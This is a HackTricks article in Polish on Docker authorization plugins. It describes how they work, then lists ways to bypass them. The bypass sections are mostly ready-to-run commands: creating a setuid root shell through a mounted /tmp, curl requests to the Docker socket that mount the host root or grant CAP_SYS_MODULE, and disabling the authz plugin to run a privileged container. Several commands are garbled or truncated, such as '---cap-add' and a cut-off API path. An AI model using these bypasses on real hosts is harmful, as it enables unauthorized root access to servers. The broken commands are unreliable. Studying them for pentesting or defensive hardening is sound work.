<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


Model **autoryzacji** Docker'a "out-of-the-box" to "wszystko albo nic". Każdy użytkownik mający uprawnienia dostępu do demona Docker może uruchamiać dowolne polecenia klienta Docker. To samo dotyczy wywołań korzystających z interfejsu API silnika Docker do kontaktu z demonem. Jeśli wymagasz większej kontroli dostępu, możesz tworzyć wtyczki autoryzacji i dodawać je do konfiguracji demona Docker. Dzięki wtyczce autoryzacji administrator Docker'a może konfigurować szczegółowe polityki dostępu do zarządzania dostępem do demona Docker.

# Podstawowa architektura

Wtyczki autoryzacji Docker są **zewnętrznymi wtyczkami**, które można używać do **zezwolenia/odmowy** **działań** żądanych przez demona Docker, w zależności od **użytkownika**, który je żąda, i **działania** **żądanego**.

**[Następujące informacje pochodzą z dokumentacji](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Kiedy **żądanie HTTP** jest przesyłane do demona Docker przez CLI lub za pośrednictwem interfejsu API silnika, **podsystem autoryzacji** przekazuje żądanie zainstalowanym **wtyczkom autoryzacji**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. Wtyczka jest odpowiedzialna za decyzję, czy zezwolić czy odmówić żądania.

Poniższe diagramy sekwencji przedstawiają przepływ autoryzacji zezwalającej i odmawiającej:

![Przepływ autoryzacji - zezwolenie](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Przepływ autoryzacji - odmowa](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Każde żądanie wysłane do wtyczki **zawiera uwierzytelnionego użytkownika, nagłówki HTTP i treść żądania/odpowiedzi**. Do wtyczki przekazywane są tylko **nazwa użytkownika** i **metoda uwierzytelniania** użyta. Co najważniejsze, **nie przekazywane są żadne dane uwierzytelniające użytkownika ani tokeny**. Wtyczce autoryzacji przekazywane są tylko te treści żądania/odpowiedzi, w których `Content-Type` to `text/*` lub `application/json`.

Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Po zatwierdzeniu polecenia przez wtyczkę, autoryzacja nie jest stosowana do reszty przepływu. W szczególności, dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedź HTTP w postaci porcjowanej (chunked), takich jak `logs` i `events`, tylko żądanie HTTP jest przekazywane do wtyczek autoryzacji.

Podczas przetwarzania żądania/odpowiedzi niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Docker. Aby ukończyć takie przepływy, wtyczki mogą wywoływać interfejs API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić środki umożliwiające administratorowi skonfigurowanie odpowiednich polityk uwierzytelniania i zabezpieczeń.

## Wiele wtyczek

Jesteś odpowiedzialny za **zarejestrowanie** swojej **wtyczki** jako części uruchamiania demona Docker. Możesz zainstalować **wiele wtyczek i połączyć je ze sobą**. Ta łańcuchowa konfiguracja może być uporządkowana. Każde żądanie do demona przechodzi przez łańcuch w określonej kolejności. Dostęp jest przyznawany tylko wtedy, gdy **wszystkie wtyczki zezwalają na dostęp** do zasobu.

# Przykłady wtyczek

## Twistlock AuthZ Broker

Wtyczka [**authz**](https://github.com/twistlock/authz) pozwala na utworzenie prostego pliku **JSON**, który wtyczka będzie odczytywać w celu autoryzacji żądań. Daje to możliwość łatwej kontroli, które punkty końcowe API mogą osiągnąć poszczególni użytkownicy.

Oto przykład, który pozwoli Alice i Bobowi tworzyć nowe kontenery: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) znajdziesz zależność między żądanym adresem URL a działaniem. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) znajdziesz zależność między nazwą działania a działaniem.

## Prosty samouczek wtyczki

Możesz znaleźć **łatwą do zrozumienia wtyczkę** z szczegółowymi informacjami na temat instalacji i debugowania tutaj: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Przeczytaj plik `README` i kod `plugin.go`, aby zrozumieć, jak działa.

# Ominięcie wtyczki autoryzacji Docker

## Wyliczanie dostępu

Główne rzeczy do sprawdzenia to **jakie punkty końcowe są dozwolone** i **jakie wartości HostConfig są dozwolone**.

Aby przeprowadzić to wyliczanie, możesz **użyć narzędzia** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## niedozwolone `run --privileged`

### Minimalne uprawnienia
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Uruchamianie kontenera, a następnie uzyskiwanie uprzywilejowanej sesji

W tym przypadku administrator systemu **zakazał użytkownikom montowania woluminów i uruchamiania kontenerów z flagą `--privileged`** lub nadawania kontenerowi dodatkowych uprawnień:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Jednak użytkownik może **utworzyć powłokę wewnątrz działającego kontenera i nadać jej dodatkowe uprawnienia**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Teraz użytkownik może uciec z kontenera, korzystając z dowolnej z [**wcześniej omówionych technik**](./#privileged-flag) i **podnieść uprawnienia** wewnątrz hosta.

## Zamontuj folder z możliwością zapisu

W tym przypadku administrator systemu **zakazał użytkownikom uruchamiania kontenerów z flagą `--privileged`** lub nadawania kontenerowi dodatkowych uprawnień, a jedynie umożliwił zamontowanie folderu `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Zauważ, że być może nie możesz zamontować folderu `/tmp`, ale możesz zamontować **inny folder z możliwością zapisu**. Możesz znaleźć foldery z możliwością zapisu, używając polecenia: `find / -writable -type d 2>/dev/null`

**Należy pamiętać, że nie wszystkie foldery w systemie Linux obsługują bit suid!** Aby sprawdzić, które foldery obsługują bit suid, uruchom polecenie `mount | grep -v "nosuid"`. Na przykład zazwyczaj foldery `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` nie obsługują bitu suid.

Należy również zauważyć, że jeśli można **zamontować folder `/etc`** lub inny folder **zawierający pliki konfiguracyjne**, można je zmienić z kontenera Docker jako root, aby **wykorzystać je na hoście** i eskalować uprawnienia (może to obejmować modyfikację pliku `/etc/shadow`).
{% endhint %}

## Niezweryfikowany punkt końcowy API

Odpowiedzialność administratora systemu konfigurującego ten plugin polega na kontrolowaniu, jakie działania i z jakimi uprawnieniami może wykonywać każdy użytkownik. Dlatego jeśli administrator podejmuje **czarną listę** punktów końcowych i atrybutów, może **pominąć niektóre z nich**, które mogą umożliwić atakującemu **eskalację uprawnień**.

Możesz sprawdzić API Dockera pod adresem [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Niezweryfikowana struktura JSON

### Binds w katalogu root

Możliwe jest, że podczas konfigurowania zapory ogniowej Dockera, administrator systemu **pominął pewien ważny parametr** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList), taki jak "**Binds**".\
W poniższym przykładzie można wykorzystać tę nieprawidłową konfigurację do utworzenia i uruchomienia kontenera, który montuje folder root (/) hosta:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Zauważ, że w tym przykładzie używamy parametru **`Binds`** jako klucza na poziomie głównym w JSON, ale w interfejsie API występuje on pod kluczem **`HostConfig`**
{% endhint %}

### Binds w HostConfig

Postępuj zgodnie z tymi samymi instrukcjami jak w przypadku **Binds w root**, wykonując to **żądanie** do interfejsu API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montowanie w katalogu głównym

Postępuj zgodnie z tymi samymi instrukcjami jak w przypadku **Montowania w katalogu głównym**, wykonując ten **żądanie** do interfejsu API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montaże w HostConfig

Postępuj zgodnie z tymi samymi instrukcjami co w przypadku **Binds w root**, wykonując to **żądanie** do interfejsu API Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Niezweryfikowany atrybut JSON

Możliwe, że podczas konfigurowania zapory dockerowej przez sysadmina, **zapomniał o pewnym ważnym atrybucie parametru** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList), takim jak "**Capabilities**" wewnątrz "**HostConfig**". W poniższym przykładzie można wykorzystać tę nieprawidłową konfigurację, aby utworzyć i uruchomić kontener z uprawnieniem **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** to klucz, który zazwyczaj zawiera **interesujące** **uprawnienia**, które umożliwiają ucieczkę z kontenera. Jednak, jak już wcześniej omówiliśmy, zauważ, że korzystanie z Binds poza nim również działa i może umożliwić ominiecie ograniczeń.
{% endhint %}

## Wyłączanie wtyczki

Jeśli **sysadmin** **zapomniał** **zakazać** możliwości **wyłączenia** wtyczki, możesz z tego skorzystać, aby ją całkowicie wyłączyć!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Pamiętaj, aby **ponownie włączyć wtyczkę po eskalacji**, w przeciwnym razie **restart usługi docker nie zadziała**!

## Opisy omijania wtyczki autoryzacji

* [https://staaldraad.github.io/post/2019-07-11-omijanie-wtyczki-docker-za-pomoca-containerd/](https://staaldraad.github.io/post/2019-07-11-omijanie-wtyczki-docker-za-pomoca-containerd/)

## Odwołania

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
